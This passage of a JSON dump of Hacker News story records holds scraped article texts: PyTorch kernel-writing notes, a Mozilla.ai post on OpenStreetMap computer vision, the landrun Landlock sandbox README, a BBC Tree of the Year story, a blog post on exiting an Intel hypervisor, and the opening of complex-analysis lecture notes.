this section, we'll walk through a few of them.  But first of all, what do you need to write a kernel?\n\nWe generally think of a kernel in PyTorch consisting of the following parts:\n\nFirst, there's some metadata which we write about the kernel, which powers the code generation and lets you get all the bindings to Python, without having to write a single line of code.\nOnce you've gotten to the kernel, you're past the device type / layout dispatch. The first thing you need to write is error checking, to make sure the input tensors are the correct dimensions.  (Error checking is really important!  Don't skimp on it!)\nNext, we generally have to allocate the result tensor which we are going to write the output into.\nTime for the kernel proper.  At this point, you now should do the second, dtype dispatch, to jump into a kernel which is specialized per dtype it operates on.  (You don't want to do this too early, because then you will be uselessly duplicating code that looks the same in any case.)\nMost performant kernels need some sort of parallelization, so that you can take advantage of multi-CPU systems.  (CUDA kernels are \"implicitly\" parallelized, since their programming model is built on top of massive parallelization).\nFinally, you need to access the data and do the computation you wanted to do!\n\nIn the subsequent slides, we'll walk through some of the tools PyTorch has for helping you implementing these steps.\n\nTo take advantage of all of the code generation which PyTorch brings, you need to write a schema for your operator.  The schema gives a mypy-esque type of your function, and also controls whether or not we generate bindings for methods or functions on Tensor.  You also tell the schema what implementations of your operator should be called for given device-layout combinations.  Check out the README in native is for more information about this format.\n\nYou also may need to define a derivative for your operation in derivatives.yaml.\n\nError checking can be done by way of either a low level or a high level API.  The low level API is just a macro, TORCH_CHECK, which takes a boolean, and then any number of arguments to make up the error string to render if the boolean is not true.  One nice thing about this macro is that you can intermix strings with non-string data; everything is formatted using their implementation of operator<<, and most important data types in PyTorch have operator<< implementations.\nThe high level API saves you from having to write up repetitive error messages over and over again.  The way it works is you first wrap each Tensor into a TensorArg, which contains information about where the tensor came from (e.g., its argument name).  It then provides a number of pre-canned functions for checking various properties; e.g., checkDim() tests if the tensor's dimensionality is a fixed number.  If it's not, the function provides a user-friendly error message based on the TensorArg metadata.\n\nOne important thing to be aware about when writing operators in PyTorch, is that you are often signing up to write three operators: abs_out, which operates on a preallocated output (this implements the out= keyword argument), abs_, which operates inplace, and abs, which is the plain old functional version of an operator.\nMost of the time, abs_out is the real workhorse, and abs and abs_ are just thin wrappers around abs_out; but sometimes writing specialized implementations for each case are warranted.\n\nTo do dtype dispatch, you should use the AT_DISPATCH_ALL_TYPES macro.  This takes in the dtype of the tensor you want to dispatch over, and a lambda which will be specialized for each dtype that is dispatchable from the macro.  Usually, this lambda just calls a templated helper function.\nThis macro doesn't just \"do dispatch\", it also decides what dtypes your kernel will support.  As such, there are actually quite a few versions of this macro, which let you pick different subsets of dtypes to generate specializations for.  Most of the time, you'll just want AT_DISPATCH_ALL_TYPES, but keep an eye out for situations when you might want to dispatch to some more types.  There's guidance in Dispatch.h for how to select the correct one for your use-case.\n\nOn CPU, you frequently want to parallelize your code.  In the past, this was usually done by directly sprinkling OpenMP pragmas in your code.\n\nAt some point, we have to actually access the data.  PyTorch offers quite a few options for doing this.\n\nIf you just want to get a value at some specific location, you should use TensorAccessor.  A tensor accessor is like a tensor, but it hard codes the dimensionality and dtype of the tensor as template parameters.  When you retrieve an accessor like x.accessor<float, 3>();, we do a runtime test to make sure that the tensor really is this format; but after that, every access is unchecked.  Tensor accessors handle strides correctly, so you should prefer using them over raw pointer access (which, unfortunately, some legacy kernels do.)  There is also a PackedTensorAccessor, which is specifically useful for sending an accessor over a CUDA launch, so that you can get accessors from inside your CUDA kernel.  (One notable gotcha: TensorAccessor defaults to 64-bit indexing, which is much slower than 32-bit indexing in CUDA!)\nIf you're writing some sort of operator with very regular element access, for example, a pointwise operation, you are much better off using a higher level of abstraction, the TensorIterator.   This helper class automatically handles broadcasting and type promotion for you, and is quite handy.\nFor true speed on CPU, you may need to write your kernel using vectorized CPU instructions.  We've got helpers for that too!  The Vec256 class represents a vector of scalars and provides a number of methods which perform vectorized operations on them all at once.  Helpers like binary_kernel_vec then let you easily run vectorized operations, and then finish everything that doesn't round nicely into vector instructions using plain old instructions.  The infrastructure here also manages compiling your kernel multiple times under different instruction sets, and then testing at runtime what instructions your CPU supports, and using the best kernel in those situations.\n\nA lot of kernels in PyTorch are still written in the legacy TH style.  (By the way, TH stands for TorcH.  It's a pretty nice acronym, but unfortunately it is a bit poisoned; if you see TH in the name, assume that it's legacy.)  What do I mean by the legacy TH style?\n\nIt's written in C style, no (or very little) use of C++.\nIt's manually refcounted (with manual calls to THTensor_free to decrease refcounts when you're done using tensors), and\nIt lives in generic/ directory, which means that we are actually going to compile the file multiple times, but with different #define scalar_t.\n\nThis code is pretty crazy, and we hate reviewing it, so please don't add to it.  One of the more useful tasks that you can do, if you like to code but don't know too much about kernel writing, is to port some of these TH functions to ATen.\n\nTo wrap up, I want to talk a little bit about working efficiently on PyTorch.  If the largeness of PyTorch's C++ codebase is the first gatekeeper that stops people from contributing to PyTorch, the efficiency of your workflow is the second gatekeeper.  If you try to work on C++ with Python habits, you will have a bad time: it will take forever to recompile PyTorch, and it will take you forever to tell if your changes worked or not.\nHow to work efficiently could probably be a talk in and of itself, but this slide calls out some of the most common anti-patterns I've seen when someone complains: \"It's hard to work on PyTorch.\"\n\nIf you edit a header, especially one that is included by many source files (and especially if it is included by CUDA files), expect a very long rebuild.  Try to stick to editing cpp files, and edit headers sparingly!\nOur CI is a very wonderful, zero-setup way to test if your changes worked or not. But expect to wait an hour or two before you get back signal.  If you are working on a change that will require lots of experimentation, spend the time setting up a local development environment.  Similarly, if you run into a hard to debug problem on a specific CI configuration, set it up locally.  You can download and run the Docker images locally\nThe CONTRIBUTING guide explains how to setup ccache; this is highly recommended, because sometimes it will help you get lucky and avoid a massive recompile when you edit a header.  It also helps cover up bugs in our build system, when we recompile files when we shouldn't.\nAt the end of the day, we have a lot of C++ code, and you will have a much more pleasant experience if you build on a beefy server with CPUs and RAM.  In particular, I don't recommend doing CUDA builds on a laptop; building CUDA is sloooooow and laptops tend to not have enough juice to turnaround quickly enough.\n\nSo that's it for a whirlwind tour of PyTorch's internals!  Many, many things have been omitted; but hopefully the descriptions and explanations here can help you get a grip on at least a substantial portion of the codebase.\nWhere should you go from here?  What kinds of contributions can you make?  A good place to start is our issue tracker.  Starting earlier this year, we have been triaging issues; issues labeled triaged mean that at least one PyTorch developer has looked at it and made an initial assessment about the issue.  You can use these labels to find out what issues we think are high priority or look up issues specific to some module, e.g., autograd or find issues which we think are small (word of warning: we're sometimes wrong!)\nEven if you don't want to get started with coding right away, there are many other useful activities like improving documentation (I love merging documentation PRs, they are so great), helping us reproduce bug reports from other users, and also just helping us discuss RFCs on the issue tracker. PyTorch would not be where it is today without our open source contributors; we hope you can join us too!\n\n          May 16, 2019\n          PyTorch",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "6bf5f1d4fb0b83cb",
    "title": {
      "en": "Map Features in OpenStreetMap with Computer Vision",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://blog.mozilla.ai/map-features-in-openstreetmap-with-computer-vision/",
    "score": 237,
    "by": "Brysonbw",
    "time": 1742665330,
    "content": "Map Features in OpenStreetMap with Computer Vision\n                Mozilla.ai developed and released the OpenStreetMap AI Helper Blueprint. If you love maps and are interested in training your own computer vision model, you’ll enjoy diving into this Blueprint.\n\n                    David de la Iglesia Castro\n\n                        Mar 4, 2025\n                            — 5 min read\n\n            Photo by Stefancu Iulian / Unsplash\n\n            MotivationAt Mozilla.ai, we believe that there are a lot of opportunities where artificial intelligence (AI) can empower communities driven by open collaboration.These opportunities need to be designed carefully, though, as many members of these communities (and people in general) are increasingly worried about the amount of AI slop flooding the internet.With this idea in mind we developed and released the OpenStreetMap AI Helper Blueprint. If you love maps and are interested in training your own computer vision model, you’ll enjoy diving into this Blueprint.Why OpenStreetMap?Data is one of the most important components of any AI application, and OpenStreetMap has a vibrant community that collaborates to maintain and extend the most complete open map database available. If you haven’t heard of it, OpenStreetMap is an open, editable map of the world created by a community of mappers who contribute and maintain data about roads, trails, cafés, railway stations, and more.Combined with other sources, like satellite imagery, this database offers infinite possibilities to train different AI models.As a long-time user and contributor to OpenStreetMap , I wanted to build an end-to-end application where a model is first trained with this data and then used to contribute back.The idea is to use AI to speed up the slower parts of the mapping process (roaming around the map, drawing polygons) while keeping a human in the loop for the critical parts (verifying that the generated data is correct).Why Computer Vision?Large Language Models (LLM) and, more recently, Visual Language Models (VLM) are sucking all the oxygen out of the AI room, but there are a lot of interesting applications that don’t (need to) use this type of models.Many of the Map Features you can find in OpenStreetMap are represented with a polygon ('Area'). It turns out that finding and drawing these polygons is a very time consuming task for a human, but Computer Vision models can be easily trained for the task (when provided with enough data).We chose to split the work of finding and drawing map features into 2 computer vision tasks using state-of-the-art non-LLM models: Object Detection with YOLOv11, by Ultralytics, which identifies where relevant features exist in an image.Segmentation with SAM2, by Meta, which refines the detected features by outlining their exact shape.These models are lightweight, fast, and local-friendly – it’s refreshing to work with models that don’t demand a high-end GPU just to function. As an example, the combined weights of YOLOv11 and SAM2 take much less disk space (<250MB) than any of the smallest Visual Language Models available, like SmolVLM (4.5GB).By combining these models, we can automate much of the mapping process while keeping humans in control for final verification.The OpenStreetMap AI Helper BlueprintThe Blueprint can be divided into 3 stages:Stage 1: Create an Object Detection dataset from OpenStreetMapThe first stage involves fetching data from OpenStreetMap, combining it with satellite images, and transforming it into a format suitable for training.You can run it yourself in the Create Dataset Colab.For fetching OpenStreetMap data, we use:The Nominatim API to provide users with a flexible way of selecting an area of interest. In our swimming pool example, we use Galicia for training and Viana do Castelo for validation.The Overpass API to download all the relevant polygons using specific tags within the selected area of interest. In our swimming pool example, we use leisure=swimming_pool discarding the ones also tagged with location=indoor.Once all the polygons have been downloaded, you can choose a zoom level. We use this zoom level to first identify all the tiles that contain a polygon and then download them using the Static Tiles API from Mapbox.The polygons in latitude and longitude coordinates are transformed to a bounding box in pixel coordinates relative to each tile and then saved in the Ultralytics YOLO format.Finally, the dataset is uploaded to the Hugging Face Hub. You can check our example mozilla-ai/osm-swimming-pools.Stage 2 - Finetune an Object Detection modelOnce the dataset is uploaded in the right format, finetuning a YOLOv11 (or any other model supported by Ultralytics) is quite easy. You can run it yourself in the Finetune Model Colab and check all the available hyperparameters.Once the model is trained, it is also uploaded to the Hugging Face Hub. You can check our example mozilla-ai/swimming-pool-detector.Stage 3 - Contributing to OpenStreetMapOnce you have a finetuned Object Detection model, you can use it to run inference across multiple tiles. You can run inference yourself in the Run Inference Colab. We also provide a hosted demo where you can try our example swimming pool detector: HuggingFace Demo.The inference requires a couple of human interactions. First, you need to first pick a point of interest in the map:After a point is selected, a bounding box is computed around it based on the margin argument.All the existing elements of interest are downloaded from OpenStreetMap, and all the tiles are downloaded from Mapbox and joined to create a stacked image.The stacked image is divided into overlapping tiles. For each tile, we run the Object Detection model (YOLOv11). If an object of interest is detected (e.g. a swimming pool), we pass the bounding box to the Segmentation model (SAM2) to obtain a segmentation mask.All the predicted polygons are checked against the existing ones, downloaded from OpenStreetMap, in order to avoid duplicates.All those identified as new are displayed one by one for manual verification and filtering.The ones you chose to keep will be then uploaded to OpenStreetMap in a single changeset.Closing thoughtsOpenStreetMap is a powerful example of open collaboration to create a rich, community-driven map of the world. The OpenStreatMap AI Helper Blueprint shows that, with the right approach, AI can enhance human contributions while keeping human verification at the core.In the fully manual process it takes about 1 min to map 2-3 swimming pools, whereas using the blueprint, even without an optimized UX, I can map about 10-15 in the same time (~5x more).It also highlights the value of high-quality data from projects like OpenStreetMap, which enables to easily train models like YOLOv11 to perform object detection – proving that you shouldn’t always throw an LLM at the problem.We’d love for you to try the OpenStreetMap AI Helper Blueprint and experiment with training a model on a different map feature. If you’re interested, feel free to contribute to the repo to help improve it, or fork it to extend it even further!To find other Blueprints we’ve released, check out the Blueprints Hub.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "3afe2dbf1082bde5",
    "title": {
      "en": "EmptyEpsilon open source spaceship bridge simulator",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://daid.github.io/EmptyEpsilon/",
    "score": 49,
    "by": "mmooss",
    "time": 1742486151,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "3869c6ad1a3c4b22",
    "title": {
      "en": "Have we underestimated the total number of people on Earth?",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.newscientist.com/article/2472604-have-we-vastly-underestimated-the-total-number-of-people-on-earth/",
    "score": 17,
    "by": "wahern",
    "time": 1742491652,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "99e9a4ff0d6d0812",
    "title": {
      "en": "Landrun: Sandbox any Linux process using Landlock, no root or containers",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://github.com/Zouuup/landrun",
    "score": 327,
    "by": "Zoup",
    "time": 1742651819,
    "content": "landrun\nA lightweight, secure sandbox for running Linux processes using Landlock LSM. Think firejail, but with kernel-level security and minimal overhead.\nFeatures\n\n🔒 Kernel-level security using Landlock LSM\n🚀 Lightweight and fast execution\n🛡️ Fine-grained access control for directories\n🔄 Support for read and write paths\n⚡ Path-specific execution permissions\n🌐 TCP network access control (binding and connecting)\n\nDemo\n\nRequirements\n\nLinux kernel 5.13 or later with Landlock LSM enabled\nLinux kernel 6.8 or later for network restrictions (TCP bind/connect)\nGo 1.18 or later (for building from source)\n\nInstallation\nQuick Install\ngo install github.com/zouuup/landrun/cmd/landrun@latest\n\nFrom Source\ngit clone https://github.com/zouuup/landrun.git\ncd landrun\ngo build -o landrun cmd/landrun/main.go\nsudo cp landrun /usr/local/bin/\n\nUsage\nBasic syntax:\nlandrun [options] <command> [args...]\n\nOptions\n\n--ro <path>: Allow read-only access to specified path (can be specified multiple times or as comma-separated values)\n--rox <path>: Allow read-only access with execution to specified path (can be specified multiple times or as comma-separated values)\n--rw <path>: Allow read-write access to specified path (can be specified multiple times or as comma-separated values)\n--rwx <path>: Allow read-write access with execution to specified path (can be specified multiple times or as comma-separated values)\n--bind-tcp <port>: Allow binding to specified TCP port (can be specified multiple times or as comma-separated values)\n--connect-tcp <port>: Allow connecting to specified TCP port (can be specified multiple times or as comma-separated values)\n--best-effort: Use best effort mode, falling back to less restrictive sandbox if necessary [default: enabled]\n--log-level <level>: Set logging level (error, info, debug) [default: \"error\"]\n\nImportant Notes\n\nYou must explicitly add the path to the command you want to run with either --ro or --rox flag\nFor system commands, you typically need to include /usr/bin, /usr/lib, and other system directories\nUse --rox for directories containing executables you need to run\nUse --rwx for directories where you need both write access and the ability to execute files\nNetwork restrictions require Linux kernel 6.8 or later with Landlock ABI v5\nThe --best-effort flag allows graceful degradation on older kernels that don't support all requested restrictions\nPaths can be specified either using multiple flags or as comma-separated values (e.g., --ro /usr,/lib,/home)\n\nEnvironment Variables\n\nLANDRUN_LOG_LEVEL: Set logging level (error, info, debug)\n\nExamples\n\nRun a command with read-only access to a directory:\n\nlandrun --rox /usr/ --ro /path/to/dir ls /path/to/dir\n\nRun a command with write access to a directory:\n\nlandrun --rox /usr/bin --ro /lib --rw /path/to/dir touch /path/to/dir/newfile\n\nRun a command with execution permissions:\n\nlandrun --rox /usr/ --ro /lib,/lib64 /usr/bin/bash\n\nRun with debug logging:\n\nlandrun --log-level debug --rox /usr/ --ro /lib,/lib64,/path/to/dir ls /path/to/dir\n\nRun with network restrictions:\n\nlandrun --rox /usr/ --ro /lib,/lib64 --bind-tcp 8080 --connect-tcp 80 /usr/bin/my-server\n\nThis will allow the program to only bind to TCP port 8080 and connect to TCP port 80.\n\nRun a DNS client with appropriate permissions:\n\nlandrun --log-level debug --ro /etc,/usr --rox /usr/ --connect-tcp 443 nc kernel.org 443\n\nThis allows connections to port 443, requires access to /etc/resolv.conf for resolving DNS.\n\nRun a web server with selective network permissions:\n\nlandrun --rox /usr/bin --ro /lib,/lib64,/var/www --rwx /var/log --bind-tcp 80,443 /usr/bin/nginx\n\nRunning anything without providing paramneters is... maximum security jail!\n\nlandrun ls\n\nIf you keep getting permission denied without knowing what exactly going on, best to use strace with it.\n\nlandrun --rox /usr strace -f -e trace=all ls\n\nSecurity\nlandrun uses Linux's Landlock LSM to create a secure sandbox environment. It provides:\n\nFile system access control\nDirectory access restrictions\nExecution control\nTCP network restrictions\nProcess isolation\n\nLandlock is an access-control system that enables processes to securely restrict themselves and their future children. As a stackable Linux Security Module (LSM), it creates additional security layers on top of existing system-wide access controls, helping to mitigate security impacts from bugs or malicious behavior in applications.\nLandlock Access Control Rights\nlandrun leverages Landlock's fine-grained access control mechanisms, which include:\nFile-specific rights:\n\nExecute files (LANDLOCK_ACCESS_FS_EXECUTE)\nWrite to files (LANDLOCK_ACCESS_FS_WRITE_FILE)\nRead files (LANDLOCK_ACCESS_FS_READ_FILE)\nTruncate files (LANDLOCK_ACCESS_FS_TRUNCATE) - Available since Landlock ABI v3\n\nDirectory-specific rights:\n\nRead directory contents (LANDLOCK_ACCESS_FS_READ_DIR)\nRemove directories (LANDLOCK_ACCESS_FS_REMOVE_DIR)\nRemove files (LANDLOCK_ACCESS_FS_REMOVE_FILE)\nCreate various filesystem objects (char devices, directories, regular files, sockets, etc.)\nRefer/reparent files across directories (LANDLOCK_ACCESS_FS_REFER) - Available since Landlock ABI v2\n\nNetwork-specific rights (requires Linux 6.8+ with Landlock ABI v5):\n\nBind to specific TCP ports (LANDLOCK_ACCESS_NET_BIND_TCP)\nConnect to specific TCP ports (LANDLOCK_ACCESS_NET_CONNECT_TCP)\n\nLimitations\n\nLandlock must be supported by your kernel\nNetwork restrictions require Linux kernel 6.8+ with Landlock ABI v5\nSome operations may require additional permissions\nFiles or directories opened before sandboxing are not subject to Landlock restrictions\n\nKernel Compatibility Table\n\nFeature\nMinimum Kernel Version\nLandlock ABI Version\n\nBasic filesystem sandboxing\n5.13\n1\n\nFile referring/reparenting control\n5.17\n2\n\nFile truncation control\n6.1\n3\n\nNetwork TCP restrictions\n6.8\n5\n\nTroubleshooting\nIf you receive \"permission denied\" or similar errors:\n\nEnsure you've added all necessary paths with --ro or --rw\nTry running with --log-level debug to see detailed permission information\nCheck that Landlock is supported and enabled on your system:\ngrep -E 'landlock|lsm=' /boot/config-$(uname -r)\n\nYou should see CONFIG_SECURITY_LANDLOCK=y and lsm=landlock,... in the output\nFor network restrictions, verify your kernel version is 6.8+ with Landlock ABI v5:\nuname -r\n\nTechnical Details\nImplementation\nThis project uses the landlock-lsm/go-landlock package for sandboxing, which provides both filesystem and network restrictions. The current implementation (v0.1.3) supports:\n\nRead/write/execute restrictions for files and directories\nTCP port binding restrictions\nTCP port connection restrictions\nBest-effort mode for graceful degradation on older kernels\n\nBest-Effort Mode\nWhen using --best-effort (disabled by default), landrun will gracefully degrade to using the best available Landlock version on the current kernel. This means:\n\nOn Linux 6.8+: Full filesystem and network restrictions\nOn Linux 6.1-6.7: Filesystem restrictions including truncation, but no network restrictions\nOn Linux 5.17-6.0: Basic filesystem restrictions including file reparenting, but no truncation control or network restrictions\nOn Linux 5.13-5.16: Basic filesystem restrictions without file reparenting, truncation control, or network restrictions\nOn older Linux: No restrictions (sandbox disabled)\n\nFuture Features\nBased on the Linux Landlock API capabilities, we plan to add:\n\n🔒 Enhanced filesystem controls with more fine-grained permissions\n🌐 Support for UDP and other network protocol restrictions (when supported by Linux kernel)\n🔄 Process scoping and resource controls\n🛡️ Additional security features as they become available in the Landlock API\n\nLicense\nThis project is licensed under the GNU General Public License v2\nContributing\nContributions are welcome! Please feel free to submit a Pull Request.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "6385b87696d8b67c",
    "title": {
      "en": "Do Viruses Trigger Alzheimer's?",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.economist.com/science-and-technology/2025/03/17/do-viruses-trigger-alzheimers",
    "score": 12,
    "by": "helsinkiandrew",
    "time": 1742714943,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "af6f19d8a0fd65d6",
    "title": {
      "en": "300-year-old Polish beech voted Tree of the Year",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.bbc.co.uk/news/articles/c20dd6yk55yo",
    "score": 88,
    "by": "n1b0m",
    "time": 1742416678,
    "content": "300-year-old Polish beech voted Tree of the Year 4 days agoShareSaveMaddie MolloyBBC Climate & ScienceShareSaveMarcin_KopijThe 300-year-old winner is a beloved symbol of its local communityThe Heart of the Dalkowskie Hills, a breathtaking 300-year-old beech, has won Poland the European Tree of the Year award for the fourth consecutive time.Standing tall in Dalków's historic park, the deep-red beauty is a beloved symbol for the community. Visitors also have a quirky tradition: tossing peanuts into a hole in it, hoping for their wishes to come true.The contest celebrates our relationship with nature by showcasing beautiful and unique trees from across the continent.Here are some of the other trees that scored high in the competition:Ana RuteTaking second place is the majestic Portuguese Moreton Bay Fig.This tree was planted in the 19th Century in Coimbra's romantic Quinta das Lágrimas Gardens from seeds exchanged with Sydney's Botanical Garden and is a treasured landmark.Fran JaraIn third place is the Pino de Juan Molinera.A 400-year-old stone pine in Abengibre, Spain, this tree has sheltered generations of locals and witnessed countless celebrations, childhood games and romances. It has endured floods, snowstorms and a lightning strike, standing as a testament to resilience and history.Other notable entriesJillian DonnachieThe Skipinnish Oak in Scotland, UK is a 400-year-old giant, standing proudly in Lochaber's woodland.It is one of the region's largest oaks and a vital ecosystem for rare lichens like the black-eyed Susan.Recently crowned the UK winner, it is a beloved local treasure.Rudi DebruyneThe Old Chestnut of Sint-Rafaël in Belgium is a 150– to 200-year-old witness to the history of Sint-Job-in-'t-Goor.David KabalinThe Tree of Freedom in Rab, Croatia, is a 105-year-old holm oak that stands as a symbol of community and heritage.Generations have cherished it, with many families passing down stories of ancestors who helped plant it. Its centennial was celebrated with a grand event, honouring its role in the town's history.Lucie MojžíšováThe Lukavice Oak in the Czech Republic is a 700- to 800-year-old survivor, once threatened by estate owners who tried to remove its soil.Defying destruction, it still stands strong, symbolising resilience and pride for the local community.Emmanuel Boitier Terre SauvageThe Peaceful Oak of Saint-Maurice in France is a 200– to 250 year-old guardian of the Laïta River, standing at the entrance of the Abbey of Saint-Maurice.A haven for wildlife, it even has an otter-shaped bench beside it, honouring its playful regular companion.Erika KovácsThe Plane Tree in the Archbishop's Garden in Hungary is a historic landmark in Eger, known for its grandeur and shaded canopy.Legend says Hungarian leaders, including Lajos Kossuth, rested beneath it before the 1849 Battle of Kápolna.SardiniaRegionForestryCorpsThe Tasso di Matari in Sardinia, Italy, is one of the island's oldest yew trees, standing for centuries in the Supramonte di Urzulei.Overlooking an ancient Nuragic village, it bears carvings on its trunk, marking the passage of time.Agnis MelderisThe Mēru Grand Oak in Latvia is a 200 year-old giant with a canopy spanning 39 meters.Linked to an old legend of survival after the Northern War, it is seen as a guardian of the region.Giedre SvikleThe Oak of Varniškės in Lithuania is a more than 200 year-old symbol of strength, love, and tradition.A family once built their home and herb farm beside it, making it the heart of their lives. Martin BabarikThe Wild Pear from Bošáca, Slovakia, is a 150-year-old tree that grew from a stray seed on Lysica Hill.It stands in a region known for its rich fruit-growing and is a beloved landmark. Its location attracts paragliders and hosts an annual competition for flying historical model airplanes.Rob Visser PhotographyThe Ginkgo Biloba in Leiden, Netherlands, is a 240 year-old \"living fossil\" and the second oldest in Europe.This ancient species, dating back to the time of dinosaurs, was preserved in China for its symbolic meaning of love and hope.Ruslana VasyliukThe White Acacia in Ivano-Frankivsk, Ukraine, is a 140 year-old rarity known as the Witness of Seven Generations.It has stood in six different states during the course of history. The full results can be seen on Europe's Tree of the Year website.Poland's 'Heart of the Garden' named tree of 2024Ancient oak named after a band is UK Tree of the YearTreesNaturePoland",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "1e51268ed4d16a02",
    "title": {
      "en": "Quitting an Intel x86 Hypervisor",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://halobates.de/blog/p/446",
    "score": 73,
    "by": "todsacerdoti",
    "time": 1742676124,
    "content": "Quitting an Intel x86 hypervisor\nwithout comments\n\nThis is an esoteric topic that might be of interest to people implementing Intel hypervisors. It assumes you know the basics of the Intel virtualization architecture, see Hypervisor from scratch for a tutorial. The actual full VT architecture is described in Volume 3 of the Intel SDMLet’s say we write an x86 hypervisor that starts in the UEFI environment and virtualizes the the initialization phase of an OS. But the hypervisor wants to quit eventually to not  cause extra overhead during OS run time.The way the hypervisor works is that it runs in its own memory and with its own page tables which are switched atomically on every VM exit by the VT-x implementation. This way it is isolated from the main OS.At some exit with the hypervisor running in its own context it decides that it is not needed anymore and wants to quit. To disable VT support the VMXOFF instruction can be used. But what we really need is an atomic VMXOFF + switch to the original OS page plus a jump, and all that without using any registers which need to be already restored to the original state of the OS. One trick is to use the MOV to CR3 instruction that reloads the page table as a jump. As soon as the page table is reloaded the CPU will fetch the next instruction with the translations from the freshly loaded page table, so we can transfer execution to the guest context. However to do that the MOV CR3 needs to be just before the page offset of the target instruction. This can be done by copying a trampoline to the right page offset (potentially overlapping into the previous page). The trampoline is located in a special transfer page table mapping that places writable code pages overlapping the target mapping.But there are some complications. The hypervisor also needs to load the segmentation state (like GDT/LDT) of the guest. In theory they could just be loaded by mapping these guest pages into the transfer mapping and loading them before the transfer.  But what happens if the GDT/LDT is on the same page as the target address (this is common in real OS’ assembler startup code which is a small assembler file without any page separation between code and data). One option would be to copy them to the transfer page too and load it there, or the hypervisor first copies them to a temporary buffer and loads it from there. In the second option the base addresses of these structures will be incorrect, but in practice you can often rely on them getting reloaded eventually anyways.Another problem is the register state of the target. MOV to CR3 needs a register as the source of the reload, and it needs to be the last instruction of the trampoline. So it is impossible to restore the register it uses. But remember the hypervisor is doing this as the result of a exit. If we chose an exit for a condition that already clobbers a register we can use the same register for the reload and the next instruction executed in the original guest (and which caused the exit originally) will just overwrite it again.\n\nA very convenient instruction for this is CPUID. It is executed multiple times in OS startup and clobbers multiple registers. In fact VMX always intercepts CPUID so it has to handle these exits in any case. So the trick to quit an hypervisor is to wait for the next CPUID exit and then use one of the registers clobbered by CPUID for the final CR3 reload.  This will have inconsistent register state for one instruction in the target, but unless the original OS is currently running a debugger it will never notice. In principle any exit as a result of an instruction that clobbers a register can be used for this.There is another potential complication if the target address of the OS conflicts with where the hypervisor is running before entering the transfer mapping. This could be solved with a third auxiliary mapping that is used before jumping to the transfer trampoline. In practice it doesn’t seem to be a problem because x86 OS typically run in a 1:1 mapping for startup, and that cannot conflict with the 1:1 mapping used by  UEFI programs as our hypervisor.\n\nHappy hypervisor hacking!\n\n    Written by therapsid\n    March 18th, 2025 at 9:34 pm\n\n    Posted in curiosities,kernel\n\n    « The browser circle closes again\n\nLeave a Reply\n\nName\n\nMail (will not be published)\n\nWebsite\n\nΔdocument.getElementById( \"ak_js_1\" ).setAttribute( \"value\", ( new Date() ).getTime() );",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "9de1101d0d490e83",
    "title": {
      "en": "Mathematical Methods for Physics [pdf]",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.ma.imperial.ac.uk/~dturaev/Mathematical_Methods2021.pdf",
    "score": 112,
    "by": "ibobev",
    "time": 1742673532,
    "content": "Mathematical Methods PHYS50007  Lectured by Dmitry Turaev ∗  assisted by Henry Chiu, Lifan Xuan, and Stuart Patching Spring Term 2021  1   Lecture 1: Analytic Functions of a Complex Variable  1.1   Definitions and Basic Properties  A complex number has the form   z   =   x   +   iy .   We denote the   real   and   imaginary   parts respectively as  x   = Re( z ) and   y   = Im( z ). We may also think of   z   as a point in the complex plane,which in polar coordinates has   absolute value   r   =   | z |   =   √ x 2   +   y 2   and   argument   ϕ   satisfying   x   =   r   cos   ϕ   and   y   =   r   sin   ϕ . Note that   ϕ  is defined periodically with period 2 π   and may also be denoted   ϕ   = arg( z ).  Figure 1: A complex number visualised on the com- plex plane.  Complex numbers obey the following algebraic properties:  z 1   +   z 2   =( x 1   +   x 2 ) +   i ( y 1   +   y 2 )  z 1 z 2   =( x 1   +   iy 1 )( x 2   +   iy 2 ) = ( x 1 x 2   −   y 1 y 2 ) +   i ( y 1 x 2   +   x 1 y 2 ) i.e. they have the same algebra as the real numbers, with the convention   i 2   =   − 1.  ∗ dturaev@imperial.ac.uk; lecture notes from previous years are available at   https://wwwf.imperial.ac.uk/~dturaev/  1\n\nFigure 2: Complex conjugate   z ∗   =   x   −   iy   is defined by reflecting in the   x -axis.  If   z   =   x   +   iy   then the   complex conjugate   is defined as   z ∗   =   x   −   iy , which is the symmetric image of   z   with respect to the   x -axis. Note the following properties of the complex conjugate:  r ( z ) = √ x 2   +   y 2   =   r ( z ∗ )  ϕ ( z ) =   −   ϕ ( z ∗ )  zz ∗   =( x   +   iy )( x   −   iy ) =   x 2   +   y 2   =   | z | 2  This helps us to obtain a useful formula for the division of complex numbers:  z 1  z 2  =   z 1 z ∗  2  z 2 z ∗  2  =  ( x 1   +   iy 1 )( x 2   −   iy 2 )  x 2 2   +   y 2 2  We may also do multiplication in polar coordinates:  z 1 z 2   =( r 1   cos   ϕ 1   +   ir 1   sin   ϕ 1 )( r 2   cos   ϕ 2   +   ir 2   sin   ϕ 2 ) = r 1 r 2   [cos   ϕ 1   cos   ϕ 2   −   sin   ϕ 1   sin   ϕ 2   +   i (cos   ϕ 1   sin   ϕ 2   + sin   ϕ 1   cos   ϕ 2 )] = r 1 r 2   [cos( ϕ 1   +   ϕ 2 ) +   i   sin( ϕ 1   +   ϕ 2 )] where we use the double-angle formulae for sin and cos. Then we see that  | z 1 z 2 |   =   | z 1 | | z 2 |  and arg( z 1 z 2 ) = arg( z 1 ) + arg( z 2 ) .  Thus, we may take the   n th power and, after that,   n th root of   z   as:  z n   = r n (cos( nϕ ) +   i   sin( nϕ ))  n √ z   = cos  (   ϕ   + 2 